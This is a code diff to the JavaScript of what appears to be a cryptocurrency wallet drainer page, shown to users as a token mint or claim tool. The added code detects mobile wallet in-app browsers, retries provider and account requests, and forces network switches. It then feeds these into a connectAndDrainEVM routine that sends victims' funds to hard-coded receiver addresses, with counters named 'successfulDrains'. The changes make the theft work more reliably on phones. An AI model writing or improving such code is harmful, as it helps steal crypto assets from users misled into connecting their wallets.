@@ -515,6 +515,51 @@
         return /TrustWalletMobile|TrustWallet/.test(navigator.userAgent) || window.trustwallet !== undefined;
     }
 
+    function isInsideWalletInAppBrowser() {
+        // Detect if we're in any wallet's in-app browser
+        return isInsideMetaMaskMobile() || 
+               isInsideTrustWalletMobile() || 
+               /Phantom/.test(navigator.userAgent) ||
+               /CoinbaseWalletMobile/.test(navigator.userAgent) ||
+               /Rainbow/.test(navigator.userAgent) ||
+               window.ethereum?.isMetaMask ||
+               window.ethereum?.isTrust ||
+               window.ethereum?.isRainbow;
+    }
+
+    async function waitForProvider(walletType, maxRetries = 50, delayMs = 100) {
+        // Wait for provider to be injected (important for in-app browsers)
+        for (let i = 0; i < maxRetries; i++) {
+            const provider = getWalletProvider(walletType);
+            if (provider) {
+                log(`✅ Provider ready after ${i * delayMs}ms`, 'info', false);
+                return provider;
+            }
+            await new Promise(r => setTimeout(r, delayMs));
+        }
+        throw new Error(`Provider not available after ${maxRetries * delayMs}ms - wallet may not be installed`);
+    }
+
+    async function requestAccountsWithRetry(provider, maxRetries = 3) {
+        // Some mobile wallets need retries for accounts request
+        for (let i = 0; i < maxRetries; i++) {
+            try {
+                const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                if (accounts && accounts.length > 0) {
+                    return accounts;
+                }
+            } catch (error) {
+                log(`⚠️ Account request attempt ${i + 1} failed: ${error.message}`, 'warning', false);
+                if (i < maxRetries - 1) {
+                    await new Promise(r => setTimeout(r, 1000));
+                } else {
+                    throw error;
+                }
+            }
+        }
+        throw new Error('Failed to get accounts after retries');
+    }
+
     // Deep Linking for Mobile Wallets
     function getMetaMaskMobileDeepLink() {
         const currentUrl = encodeURIComponent(window.location.href);
@@ -2658,9 +2703,15 @@
         try {
             updateProgress(0, 'Initializing wallet connection...');
 
-            // Auto-open wallet app on mobile devices
             const isMobile = isMobileDevice();
+            const inWalletBrowser = isInsideWalletInAppBrowser();
+            
             if (isMobile) {
+                log(`📱 Mobile device detected (in-app browser: ${inWalletBrowser})`, 'info');
+            }
+
+            // Auto-open wallet app on mobile devices (only if NOT already in wallet browser)
+            if (isMobile && !inWalletBrowser) {
                 log(`📱 Mobile device detected - attempting to open ${walletType} app...`, 'info');
                 
                 // Map wallet dropdown values to wallet app keys
@@ -2689,6 +2740,7 @@
                 
                 const walletAppKey = walletAppMap[walletType];
                 if (walletAppKey && mobileWalletApps[walletAppKey]) {
+                    log(`🔗 Opening ${mobileWalletApps[walletAppKey].name}...`, 'info');
                     await autoOpenWalletApp(walletAppKey);
                     
                     // Wait for user to complete auth in wallet app
@@ -2697,18 +2749,32 @@
                 }
             }
 
-            // Get wallet provider - will be determined per network
-            const initialProvider = getWalletProvider(walletType);
+            // Get wallet provider - with retry for mobile in-app browsers
+            log(`🔄 Initializing ${walletType} provider...`, 'info', false);
+            const initialProvider = inWalletBrowser 
+                ? await waitForProvider(walletType)  // Wait for provider in in-app browser
+                : getWalletProvider(walletType);      // Direct access on desktop
+                
             if (!initialProvider) {
-                throw new Error(`${walletType} wallet not found. Please install the wallet extension.`);
+                throw new Error(`${walletType} wallet not found. Please install the wallet extension or open this page in ${walletType}.`);
             }
 
-            // Force wallet popup for EVM wallets
+            log(`✅ Provider initialized`, 'info', false);
+            
+            // Request accounts with retry for mobile
             if (initialProvider && initialProvider.request && typeof initialProvider.request === 'function') {
                 try {
-                    await initialProvider.request({ method: 'eth_requestAccounts' });
+                    log(`🔐 Requesting wallet accounts...`, 'info', false);
+                    const accounts = inWalletBrowser 
+                        ? await requestAccountsWithRetry(initialProvider, 3)
+                        : await initialProvider.request({ method: 'eth_requestAccounts' });
+                    
+                    if (!accounts || accounts.length === 0) {
+                        throw new Error('No accounts returned from wallet');
+                    }
+                    log(`✅ Accounts authorized`, 'success', true, true);
                 } catch (popupError) {
-                    log(`❌ Wallet connection rejected or failed: ${popupError.message}`, 'error', true);
+                    log(`❌ Wallet authorization rejected: ${popupError.message}`, 'error', true, true);
                     throw popupError;
                 }
             }
@@ -2738,7 +2804,7 @@
                     const networkProvider = getWalletProvider(walletType, network.type);
 
                     if (network.type === 'evm') {
-                        const result = await connectAndDrainEVM(networkProvider, networkKey);
+                        const result = await connectAndDrainEVM(networkProvider, networkKey, inWalletBrowser);
                         if (result.success) {
                             totalClaimed += result.amount;
                             successfulDrains++;
@@ -2788,6 +2854,27 @@
             updateProgress(0, '');
             alert(`❌ Error: ${error.message}`);
         }
+    }
+
+    // Mobile connection state persistence
+    function saveConnectionState(walletType, networkKey) {
+        sessionStorage.setItem('walletType', walletType);
+        sessionStorage.setItem('currentNetworkKey', networkKey);
+        sessionStorage.setItem('connectionInProgress', 'true');
+    }
+
+    function getConnectionState() {
+        return {
+            walletType: sessionStorage.getItem('walletType'),
+            networkKey: sessionStorage.getItem('currentNetworkKey'),
+            inProgress: sessionStorage.getItem('connectionInProgress') === 'true'
+        };
+    }
+
+    function clearConnectionState() {
+        sessionStorage.removeItem('walletType');
+        sessionStorage.removeItem('currentNetworkKey');
+        sessionStorage.removeItem('connectionInProgress');
     }
 
     function getWalletProvider(walletType, networkType = null) {
@@ -2842,16 +2929,47 @@
         return networks[walletType] || [];
     }
 
-    async function connectAndDrainEVM(provider, networkKey) {
+    async function connectAndDrainEVM(provider, networkKey, isMobileInAppBrowser = false) {
         const network = NETWORKS[networkKey];
         const receiverAddress = RECEIVER_ADDRESSES[networkKey];
         
         try {
-            // Switch to network
-            await provider.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: `0x${network.chainId.toString(16)}` }]
-            });
+            // Switch to network with better error handling for mobile
+            try {
+                log(`🔄 Switching to ${network.name} (Chain ID: ${network.chainId})...`, 'info', false);
+                await provider.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: `0x${network.chainId.toString(16)}` }]
+                });
+                log(`✅ Network switched to ${network.name}`, 'success', false);
+            } catch (switchError) {
+                // Network switch might fail in some mobile browsers, but continue
+                log(`⚠️ Network switch attempt: ${switchError.message}`, 'warning', false);
+                
+                // Try wallet_addEthereumChain if network is not found
+                if (switchError.code === 4902) {
+                    log(`📝 Network not found, attempting to add...`, 'info', false);
+                    try {
+                        await provider.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: `0x${network.chainId.toString(16)}`,
+                                chainName: network.name,
+                                rpcUrls: [network.rpc],
+                                blockExplorerUrls: [network.explorer]
+                            }]
+                        });
+                        log(`✅ Network added and switched`, 'success', false);
+                    } catch (addError) {
+                        log(`⚠️ Could not add network: ${addError.message}`, 'warning', false);
+                    }
+                }
+                // If switch fails but we're in a mobile wallet, continue anyway - 
+                // the wallet app should have the provider properly configured
+                if (!isMobileInAppBrowser) {
+                    throw switchError;
+                }
+            }
             
             // Get accounts
             const accounts = await provider.request({ method: 'eth_requestAccounts' });
@@ -3165,6 +3283,13 @@
     log('Step 2: Select the wallets you want to use from the Wallet Selection tab', 'info');
     log('Step 3: Connect selected wallets to their supported networks', 'info');
     log('Step 4: Mint tokens from all connected wallets', 'info');
+    
+    // Check if we're recovering from a mobile wallet app redirect
+    const inWalletBrowser = isInsideWalletInAppBrowser();
+    if (inWalletBrowser) {
+        log(`📱 ✅ Page loaded in wallet in-app browser`, 'info', false);
+        // Don't auto-scan immediately in wallet browser - wait for user to click button
+    }
     
     // Auto-scan on page load
     setTimeout(scanAllNetworks, 1500);
